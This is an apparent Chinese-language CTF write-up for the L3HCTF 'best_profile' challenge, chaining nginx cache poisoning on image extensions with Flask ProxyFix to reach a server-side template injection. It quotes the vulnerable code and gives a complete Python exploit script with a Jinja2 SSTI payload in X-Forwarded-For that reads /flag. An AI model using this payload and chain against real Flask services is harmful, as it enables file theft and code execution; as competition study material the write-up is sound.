---
title: "L3hCTF"
description: "L3hCTF best_profile writeup - nginx cache and Flask ProxyFix"
date: 2024-01-15
tags:
  - "CTF"
  - "Web Security"
  - "Flask"
  - "Nginx"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "k8x9w2m7"          # 随机URL字符串
---


## L3Hctf-best_profile 

### best_profile 

> oops, it’s my profile

主要是，nginx缓存机制和Flask ProxyFix的交互

代码审计，在app.py中

```py
@app.after_request
def set_last_ip(response):
    if current_user.is_authenticated:
        current_user.last_ip = request.remote_addr  # 从X-Forwarded-For获取
        db.session.commit()
    return response

@app.route("/ip_detail/<string:username>", methods=["GET"])
def route_ip_detail(username):
    res = requests.get(f"http://127.0.0.1/get_last_ip/{username}")  # 内部请求
    last_ip = res.text  # 获取完整HTML响应
    template = f"""
    <h1>IP Detail</h1>
    <div>{last_ip}</div>    <!-- 直接插入用户可控内容 -->
    <p>Country:{country}</p>
    """
    return render_template_string(template)  # SSTI触发点
```

同时在nginx配置中，可以利用nginx缓存投毒

```python
location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {
    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;
    proxy_pass http://127.0.0.1:5000;
    proxy_cache static;
    proxy_cache_valid 200 302 30d;  # 缓存30天！
}
```

在登录时投发送ssti，访问/get_last_ip/test.jpg，触发nginx缓存

利用缓存投毒：访问/ip_detail/test.jpg，Flask从被投毒的缓存获取数据

具体payload如下

```python
import requests

def main():
    username = "bx.jpg"
    base_url = "http://61.147.171.103:64936"
    password = "123456"
    
    session = requests.Session()
    
    headers = {
        "X-Forwarded-For": "{%set chr=lipsum.__globals__.__builtins__.chr%}{{lipsum.__globals__.__builtins__.open(chr(47)+dict(flag=a)|first|lower).read()}}"
    }
    
    registration_data = {
        "username": username,
        "password": password,
        "bio": "bx",
        "submit": "Sign Up"
    }
    
    login_data = {
        "username": username,
        "password": password,
        "submit": "Log In"
    }
    
    try:
        print("=== Registration ===")
        register_response = session.post(f"{base_url}/register", data=registration_data)
        print(register_response.text)
        
        print("\n=== Login ===")
        login_response = session.post(f"{base_url}/login", headers=headers, data=login_data)
        print(login_response.text)
        
        print("\n=== Last IP ===")
        last_ip_response = session.get(f"{base_url}/get_last_ip/{username}")
        print(last_ip_response.text)
        
        print("\n=== IP Details ===")
        ip_detail_response = session.get(f"{base_url}/ip_detail/{username}")
        print(ip_detail_response.text)
        
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

if __name__ == "__main__":
    main()
    
```

结果如下

![image-20250712133846167](/static/image-20250712133846167.png)



